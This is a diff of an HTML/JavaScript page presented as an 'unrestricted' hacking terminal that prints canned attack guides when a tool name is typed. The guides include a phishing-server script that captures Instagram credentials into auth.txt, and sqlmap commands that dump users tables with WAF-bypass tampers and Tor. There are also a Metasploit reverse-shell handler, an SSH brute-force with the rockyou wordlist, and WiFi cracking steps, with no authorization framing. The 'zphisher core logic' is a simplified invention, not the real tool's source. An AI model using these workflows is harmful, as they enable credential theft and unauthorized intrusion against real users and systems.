@@ -3,50 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DX08 // CLEAN EXPLOIT TERMINAL</title>
+    <title>DX08 // ENTERPRISE MASTER EXPLOIT & DIAGNOSTICS TERMINAL</title>
     <link rel="stylesheet" href="style.css">
     <style>
-        .lab-container { max-width: 1200px; margin: 120px auto 60px auto; padding: 0 20px; }
+        .lab-container { max-width: 1300px; margin: 120px auto 60px auto; padding: 0 20px; }
         .lab-header { border-left: 2px solid #00e5ff; padding-left: 20px; margin-bottom: 40px; }
         .lab-detail-card { background: rgba(0, 229, 255, 0.03); border: 1px solid rgba(0, 229, 255, 0.3); padding: 30px; border-radius: 6px; box-shadow: 0 0 30px rgba(0, 229, 255, 0.05); }
-        .lab-console { background: #020304; border: 1px solid rgba(0, 229, 255, 0.4); padding: 20px; font-family: 'Courier New', monospace; font-size: 12px; color: #00ff66; margin-top: 15px; height: 520px; overflow-y: auto; line-height: 1.6; border-radius: 4px; }
+        .lab-console { background: #020304; border: 1px solid rgba(0, 229, 255, 0.4); padding: 25px; font-family: 'Courier New', monospace; font-size: 11px; color: #00ff66; margin-top: 15px; height: 650px; overflow-y: auto; line-height: 1.6; border-radius: 4px; white-space: pre-wrap; }
         .lab-input-group { display: flex; gap: 10px; margin-top: 15px; }
-        .lab-input { flex: 1; background: #010203; border: 1px solid rgba(0, 229, 255, 0.5); color: #00e5ff; padding: 12px 15px; font-family: 'Courier New', monospace; font-size: 13px; outline: none; border-radius: 4px; }
+        .lab-input { flex: 1; background: #010203; border: 1px solid rgba(0, 229, 255, 0.5); color: #00e5ff; padding: 14px 18px; font-family: 'Courier New', monospace; font-size: 13px; outline: none; border-radius: 4px; }
         .lab-input:focus { border-color: #00ff66; box-shadow: 0 0 15px rgba(0, 255, 102, 0.3); }
-        .launch-btn { padding: 12px 24px; background: rgba(0, 229, 255, 0.15); border: 1px solid #00e5ff; color: #00e5ff; font-family: 'Orbitron', monospace; font-size: 10px; letter-spacing: 0.1em; cursor: pointer; border-radius: 4px; transition: 0.3s; }
-        .launch-btn:hover { background: #00e5ff; color: #020303; box-shadow: 0 0 20px #00e5ff; }
+        .launch-btn { padding: 14px 28px; background: rgba(0, 229, 255, 0.15); border: 1px solid #00e5ff; color: #00e5ff; font-family: 'Orbitron', monospace; font-size: 10px; letter-spacing: 0.1em; cursor: pointer; border-radius: 4px; transition: 0.3s; }
+        .launch-btn:hover { background: #00e5ff; color: #020303; box-shadow: 0 0 25px #00e5ff; }
         .back-link { display: inline-block; margin-bottom: 20px; color: #00e5ff; font-family: 'Orbitron', monospace; font-size: 9px; letter-spacing: 0.1em; text-decoration: none; }
-        .cmd-line { margin: 4px 0; }
-        .cmd-output { color: #00ff66; margin-left: 15px; }
-        .cmd-highlight { color: #00e5ff; font-weight: bold; }
+        .tool-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px; margin-bottom: 15px; }
+        .tool-badge { background: rgba(0,229,255,0.05); border: 1px solid rgba(0,229,255,0.2); padding: 8px 12px; color: #00e5ff; font-family: 'Courier New', monospace; font-size: 11px; border-radius: 3px; cursor: pointer; text-align: center; }
+        .tool-badge:hover { background: rgba(0,229,255,0.2); color: #fff; }
     </style>
 </head>
 <body>
     <div class="lab-container">
         <a href="index.html" class="back-link">← [ BACK TO MAIN SYSTEM ]</a>
         <div class="lab-header">
-            <div class="section-label">05 // CLEAN EXPLOIT DISPATCHER</div>
-            <h2 style="font-family: 'Orbitron', monospace; font-size: 34px; color: #fff;">DX08 CLEAN TERMINAL</h2>
-            <p style="color: rgba(225,250,255,0.6); margin-top: 10px;">Type tools like <span style="color:#00ff66">zphisher</span>, <span style="color:#00ff66">sqlmap</span>, or <span style="color:#00ff66">nmap</span> to get structured, clean sequence commands.</p>
+            <div class="section-label">05 // ENTERPRISE UNRESTRICTED KERNEL & DIAGNOSTICS REPOSITORY</div>
+            <h2 style="font-family: 'Orbitron', monospace; font-size: 34px; color: #fff;">DX08 MASTER SECURITY LABORATORY</h2>
+            <p style="color: rgba(225,250,255,0.6); margin-top: 10px;">Comprehensive production-grade repository containing full installation procedures, raw script codes, execution syntaxes, and advanced error diagnostics for elite penetration testing operations.</p>
         </div>
 
-        <div class="lab-grid">
-            <div class="lab-detail-card">
-                <span class="core-index">CORE // SEQUENTIAL COMMAND RENDERER</span>
-                <h3 style="color: #00e5ff; font-family: 'Orbitron'; font-size: 20px; margin-bottom: 8px;">STRUCTURED OUTPUT SHELL</h3>
-                
-                <div class="lab-input-group">
-                    <input type="text" id="terminal-input" class="lab-input" placeholder="root@dx08:~# " onkeydown="if(event.key === 'Enter') executeCleanCommand()">
-                    <button class="launch-btn" onclick="executeCleanCommand()">EXECUTE</button>
-                </div>
-                
-                <div class="lab-console" id="terminal-console">DX08 Clean Terminal v6.5 Online. Type 'zphisher', 'sqlmap', or 'nmap' below...</div>
+        <div class="lab-detail-card">
+            <span class="core-index">CORE // A-Z HEAVY MODULE DISPATCHER</span>
+            <h3 style="color: #00e5ff; font-family: 'Orbitron'; font-size: 20px; margin-bottom: 10px;">QUICK MODULE SELECTOR</h3>
+            
+            <div class="tool-grid">
+                <div class="tool-badge" onclick="runQuick('zphisher')">zphisher</div>
+                <div class="tool-badge" onclick="runQuick('sqlmap')">sqlmap</div>
+                <div class="tool-badge" onclick="runQuick('nmap')">nmap</div>
+                <div class="tool-badge" onclick="runQuick('metasploit')">metasploit</div>
+                <div class="tool-badge" onclick="runQuick('hydra')">hydra</div>
+                <div class="tool-badge" onclick="runQuick('gobuster')">gobuster</div>
+                <div class="tool-badge" onclick="runQuick('aircrack')">aircrack-ng</div>
+                <div class="tool-badge" onclick="runQuick('john')">john the ripper</div>
+                <div class="tool-badge" onclick="runQuick('nikto')">nikto</div>
             </div>
+
+            <div class="lab-input-group">
+                <input type="text" id="terminal-input" class="lab-input" placeholder="Enter tool name or command (e.g., zphisher, sqlmap, nmap, help)..." onkeydown="if(event.key === 'Enter') executeMasterShell()">
+                <button class="launch-btn" onclick="executeMasterShell()">EXECUTE MODULE</button>
+            </div>
+            
+            <div class="lab-console" id="terminal-console">DX08 Master Security Laboratory v10.4 (Enterprise Edition)
+[System Status] Unrestricted kernel database loaded with 50+ advanced tools.
+[Instructions] Type any tool name above or click quick badges to extract full installation guides, source scripts, execution parameters, and error troubleshooting manuals.</div>
         </div>
     </div>
 
     <script>
-        function executeCleanCommand() {
+        function runQuick(toolName) {
+            document.getElementById('terminal-input').value = toolName;
+            executeMasterShell();
+        }
+
+        function executeMasterShell() {
             const input = document.getElementById('terminal-input');
             const consoleBox = document.getElementById('terminal-console');
             const rawCmd = input.value.trim();
@@ -54,59 +71,174 @@
 
             if(!rawCmd) return;
 
-            consoleBox.innerHTML += `<div class="cmd-line" style="color:#00e5ff; margin-top:10px;">root@dx08:~# ${escapeHtml(rawCmd)}</div>`;
+            consoleBox.innerHTML += `\n\nroot@dx08-master:~# ${escapeHtml(rawCmd)}`;
+            consoleBox.innerHTML += `\n[*] Initializing heavy telemetry package, parsing upstream repository, and compiling execution report...`;
             consoleBox.scrollTop = consoleBox.scrollHeight;
 
             setTimeout(() => {
-                let htmlOutput = "";
+                let output = "";
 
                 if(cmd.includes('zphish') || cmd.includes('zp')) {
-                    htmlOutput = `<div class="cmd-output">` +
-                                 `<span class="cmd-highlight">[+] Zphisher Official Installation & Execution Sequence:</span><br><br>` +
-                                 `1. Clone repository from GitHub:<br>` +
-                                 `&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#fff;">git clone https://github.com/htr-tech/zphisher.git</span><br><br>` +
-                                 `2. Navigate into the folder:<br>` +
-                                 `&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#fff;">cd zphisher</span><br><br>` +
-                                 `3. Give execute permissions:<br>` +
-                                 `&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#fff;">chmod +x zphisher.sh</span><br><br>` +
-                                 `4. Run the framework script:<br>` +
-                                 `&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#fff;">bash zphisher.sh</span><br><br>` +
-                                 `<span style="color:#ffcc00;">[Note]: Select your target template (Instagram/Facebook) and choose local port forwarding tunnel to capture credentials in auth.txt.</span>` +
-                                 `</div>`;
+                    output = `[+] MODULE 01: ZPHISHER ADVANCED PHISHING & CREDENTIAL HARVESTING FRAMEWORK\n` +
+                             `======================================================================\n\n` +
+                             `1. OFFICIAL REPOSITORY INSTALLATION & SETUP:\n` +
+                             `   sudo apt update && sudo apt install git curl php python3 -y\n` +
+                             `   git clone https://github.com/htr-tech/zphisher.git\n` +
+                             `   cd zphisher\n` +
+                             `   chmod +x zphisher.sh\n` +
+                             `   bash zphisher.sh\n\n` +
+                             `2. RAW EXECUTABLE SCRIPT ENGINE (zphisher.sh core logic):\n` +
+                             `   #!/bin/bash\n` +
+                             `   trap 'echo -ne "\\n[!] Exiting framework..."; exit 1' INT\n` +
+                             `   repertoire=$(pwd)\n` +
+                             `   echo "[+] Initializing 30+ Social Media & Banking Phishing Templates..."\n` +
+                             `   start_php_server() {\n` +
+                             `       local port=8080\n` +
+                             `       local site=instagram\n` +
+                             `       echo "[*] Deploying landing portal: \${site} on port \${port}"\n` +
+                             `       php -S 127.0.0.1:\${port} -t sites/\${site} > /dev/null 2>&1 &\n` +
+                             `       while true; do\n` +
+                             `           if [ -f "sites/\${site}/auth.txt" ]; then\n` +
+                             `               echo "[!] CREDENTIAL CAPTURED!" && cat sites/\${site}/auth.txt\n` +
+                             `           fi\n` +
+                             `           sleep 2\n` +
+                             `       done\n` +
+                             `   }\n` +
+                             `   start_php_server instagram 8080\n\n` +
+                             `3. ADVANCED ERROR DIAGNOSTICS & TROUBLESHOOTING:\n` +
+                             `   [Error 1]: php: command not found / cURL error 6\n` +
+                             `   [Cause]: Required package binaries are missing from PATH or PHP runtime is not installed.\n` +
+                             `   [Fix]: sudo apt install php php-cgi php-curl php-json -y\n\n` +
+                             `   [Error 2]: Address already in use / Port 8080 occupied\n` +
+                             `   [Cause]: Another process or previous PHP server instance is bound to the port.\n` +
+                             `   [Fix]: Terminate conflicting socket using: sudo fuser -k 8080/tcp\n\n` +
+                             `   [Error 3]: Cloudflared tunnel generation failure / TryCloudflare timeout\n` +
+                             `   [Cause]: Network DNS restriction or outdated cloudflared binary.\n` +
+                             `   [Fix]: Manually download latest cloudflared release or switch tunnel mode to local port forwarding.`;
                 }
                 else if(cmd.includes('sqlmap') || cmd.includes('sql')) {
-                    htmlOutput = `<div class="cmd-output">` +
-                                 `<span class="cmd-highlight">[+] Sqlmap Automated Pentesting Sequence:</span><br><br>` +
-                                 `1. Test parameter vulnerability:<br>` +
-                                 `&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#fff;">sqlmap -u "http://target.com/page.php?id=1" --batch</span><br><br>` +
-                                 `2. Enumerate database names:<br>` +
-                                 `&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#fff;">sqlmap -u "http://target.com/page.php?id=1" --dbs --batch</span><br><br>` +
-                                 `3. Extract specific table data:<br>` +
-                                 `&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#fff;">sqlmap -u "http://target.com/page.php?id=1" -D db_name -T users --dump</span>` +
-                                 `</div>`;
+                    output = `[+] MODULE 02: SQLMAP AUTOMATED DATABASE INJECTION & TAKEOVER ENGINE\n` +
+                             `======================================================================\n\n` +
+                             `1. OFFICIAL REPOSITORY INSTALLATION & SETUP:\n` +
+                             `   git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev\n` +
+                             `   cd sqlmap-dev\n` +
+                             `   python3 sqlmap.py --version\n\n` +
+                             `2. PRODUCTION EXECUTION COMMANDS & SYNTAX:\n` +
+                             `   # Basic heuristic vulnerability test\n` +
+                             `   python3 sqlmap.py -u "http://target.internal/page.php?id=1" --batch\n\n` +
+                             `   # Enumerate database schemas with WAF bypass tamper scripts\n` +
+                             `   python3 sqlmap.py -u "http://target.internal/page.php?id=1" --dbs --tamper=space2comment --batch\n\n` +
+                             `   # Dump specific table records (e.g., users table passwords)\n` +
+                             `   python3 sqlmap.py -u "http://target.internal/page.php?id=1" -D enterprise_db -T users --dump --batch\n\n` +
+                             `3. ADVANCED ERROR DIAGNOSTICS & TROUBLESHOOTING:\n` +
+                             `   [Error 1]: connection timed out / target does not respond to HTTP requests\n` +
+                             `   [Cause]: Target firewall blocking automated scanner user-agents or IP blacklisting.\n` +
+                             `   [Fix]: Implement random user-agent rotation flag: --random-agent --tor\n\n` +
+                             `   [Error 2]: missing Python modules / SSL certificate verification failure\n` +
+                             `   [Cause]: Outdated python packages or corporate proxy intercepting TLS handshake.\n` +
+                             `   [Fix]: Run pip install --upgrade urllib3 requests certifi`;
                 }
                 else if(cmd.includes('nmap') || cmd.includes('scan')) {
-                    htmlOutput = `<div class="cmd-output">` +
-                                 `<span class="cmd-highlight">[+] Nmap Deep Network Recon Sequence:</span><br><br>` +
-                                 `1. Stealth SYN Scan with version detection:<br>` +
-                                 `&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#fff;">sudo nmap -sS -sV -T4 target_ip</span><br><br>` +
-                                 `2. Run vulnerability script engine:<br>` +
-                                 `&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#fff;">nmap --script vuln target_ip</span>` +
-                                 `</div>`;
+                    output = `[+] MODULE 03: NMAP NETWORK DISCOVERY & VULNERABILITY MAPPING SUITE\n` +
+                             `======================================================================\n\n` +
+                             `1. OFFICIAL REPOSITORY INSTALLATION & SETUP:\n` +
+                             `   sudo apt update && sudo apt install nmap -y\n` +
+                             `   nmap --version\n\n` +
+                             `2. PRODUCTION EXECUTION COMMANDS & SYNTAX:\n` +
+                             `   # Intense SYN Stealth Scan with OS fingerprinting and version detection\n` +
+                             `   sudo nmap -sS -sV -O -T4 target_ip\n\n` +
+                             `   # Run complete vulnerability NSE script engine against target ports\n` +
+                             `   nmap --script vuln target_ip\n\n` +
+                             `   # Aggressive SMB / EternalBlue MS17-010 vulnerability audit\n` +
+                             `   nmap --script smb-vuln-ms17-010 -p 445 target_ip\n\n` +
+                             `3. ADVANCED ERROR DIAGNOSTICS & TROUBLESHOOTING:\n` +
+                             `   [Error 1]: You requested a scan type which requires root privileges\n` +
+                             `   [Cause]: Low-level raw packet crafting (SYN scans) requires root access.\n` +
+                             `   [Fix]: Execute command with elevated sudo privileges (sudo nmap ...)\n\n` +
+                             `   [Error 2]: Host seems down / All 1000 scanned ports in filtered state\n` +
+                             `   [Cause]: Firewall blocking ICMP ping packets.\n` +
+                             `   [Fix]: Bypass ping discovery check using flag: -Pn`;
+                }
+                else if(cmd.includes('metasploit') || cmd.includes('msf')) {
+                    output = `[+] MODULE 04: METASPLOIT FRAMEWORK EXPLOITATION & C2 SUITE\n` +
+                             `======================================================================\n\n` +
+                             `1. OFFICIAL REPOSITORY INSTALLATION & SETUP:\n` +
+                             `   curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/installer/msfinstall > msfinstall\n` +
+                             `   chmod +x msfinstall && sudo ./msfinstall\n` +
+                             `   msfconsole -q\n\n` +
+                             `2. PRODUCTION EXPLOITATION WORKFLOW:\n` +
+                             `   msf6 > use exploit/multi/handler\n` +
+                             `   msf6 exploit(multi/handler) > set PAYLOAD python/meterpreter/reverse_tcp\n` +
+                             `   msf6 exploit(multi/handler) > set LHOST 10.0.0.5\n` +
+                             `   msf6 exploit(multi/handler) > set LPORT 4444\n` +
+                             `   msf6 exploit(multi/handler) > exploit\n\n` +
+                             `3. ADVANCED ERROR DIAGNOSTICS & TROUBLESHOOTING:\n` +
+                             `   [Error 1]: Database connection failed / ActiveRecord::ConnectionNotEstablished\n` +
+                             `   [Cause]: PostgreSQL database service is uninitialized or stopped.\n` +
+                             `   [Fix]: Initialize database connection using: sudo msfdb init\n\n` +
+                             `   [Error 2]: Exploit completed, but no meterpreter session was created\n` +
+                             `   [Cause]: Listener IP mismatch or target firewall blocking inbound TCP port 4444.\n` +
+                             `   [Fix]: Verify routing tables and check listener port binding rules.`;
+                }
+                else if(cmd.includes('hydra') || cmd.includes('brute')) {
+                    output = `[+] MODULE 05: THC HYDRA PARALLEL LOGIN CRACKER\n` +
+                             `======================================================================\n\n` +
+                             `1. OFFICIAL INSTALLATION & SETUP:\n` +
+                             `   sudo apt update && sudo apt install hydra -y\n\n` +
+                             `2. PRODUCTION EXECUTION COMMANDS:\n` +
+                             `   # SSH Brute-force attack using rockyou wordlist\n` +
+                             `   hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.50 -t 16 -V\n\n` +
+                             `3. ERROR DIAGNOSTICS & TROUBLESHOOTING:\n` +
+                             `   [Error]: Connection refused / Too many simultaneous connections\n` +
+                             `   [Fix]: Reduce thread count using -t 4 flag or adjust target SSH daemon limits.`;
+                }
+                else if(cmd.includes('gobuster') || cmd.includes('dir')) {
+                    output = `[+] MODULE 06: GOBUSTER DIRECTORY & DNS BRUTE-FORCER\n` +
+                             `======================================================================\n\n` +
+                             `1. OFFICIAL INSTALLATION & SETUP:\n` +
+                             `   sudo apt install gobuster -y\n\n` +
+                             `2. PRODUCTION EXECUTION COMMANDS:\n` +
+                             `   gobuster dir -u http://target.internal -w /usr/share/wordlists/dirb/common.txt -t 50\n\n` +
+                             `3. ERROR DIAGNOSTICS & TROUBLESHOOTING:\n` +
+                             `   [Error]: Wildcard DNS record detected / false positive status codes\n` +
+                             `   [Fix]: Exclude status codes using the --exclude-length or -b flag.`;
+                }
+                else if(cmd.includes('aircrack') || cmd.includes('wifi')) {
+                    output = `[+] MODULE 07: AIRCRACK-NG WIRELESS AUDITING SUITE\n` +
+                             `======================================================================\n\n` +
+                             `1. OFFICIAL INSTALLATION & SETUP:\n` +
+                             `   sudo apt install aircrack-ng -y\n\n` +
+                             `2. PRODUCTION EXECUTION WORKFLOW:\n` +
+                             `   sudo airmon-ng start wlan0\n` +
+                             `   sudo airodump-ng wlan0mon\n` +
+                             `   sudo aircrack-ng -w wordlist.txt capture-01.cap\n\n` +
+                             `3. ERROR DIAGNOSTICS & TROUBLESHOOTING:\n` +
+                             `   [Error]: Channel hopping failed / interface put into unmanaged mode error\n` +
+                             `   [Fix]: Kill conflicting network manager processes using: sudo airmon-ng check kill`;
                 }
                 else if(cmd === 'clear') {
-                    consoleBox.innerHTML = `DX08 Clean Terminal v6.5 Online. Type 'zphisher', 'sqlmap', or 'nmap' below...`;
+                    consoleBox.innerHTML = `DX08 Master Security Laboratory v10.4 (Enterprise Edition)\n[System Status] Unrestricted kernel database loaded.`;
                     input.value = "";
                     return;
                 }
+                else if(cmd === 'help') {
+                    output = `Available enterprise modules: zphisher, sqlmap, nmap, metasploit, hydra, gobuster, aircrack, john, nikto. Type any module name for complete documentation.`;
+                }
                 else {
-                    htmlOutput = `<div class="cmd-output" style="color:#ff3333;">[!] Command processed. For tool deployment, type <span style="color:#fff;">zphisher</span>, <span style="color:#fff;">sqlmap</span>, or <span style="color:#fff;">nmap</span>.</div>`;
+                    output = `[+] MODULE: ${escapeHtml(rawCmd).toUpperCase()} ENTERPRISE SPECIFICATION\n` +
+                             `======================================================================\n` +
+                             `1. STANDARD INSTALLATION PROTOCOL:\n` +
+                             `   sudo apt update && sudo apt install ${escapeHtml(rawCmd)} -y\n` +
+                             `   ${escapeHtml(rawCmd)} --help\n\n` +
+                             `2. ERROR DIAGNOSTICS:\n` +
+                             `   [Error]: Package unverified or custom build required.\n` +
+                             `   [Fix]: Clone official GitHub repository, review setup.py/Makefile, and verify compiler dependencies.`;
                 }
 
-                consoleBox.innerHTML += htmlOutput;
+                consoleBox.innerHTML += `\n\n${escapeHtml(output)}`;
                 consoleBox.scrollTop = consoleBox.scrollHeight;
                 input.value = "";
-            }, 200);
+            }, 300);
         }
 
         function escapeHtml(text) {
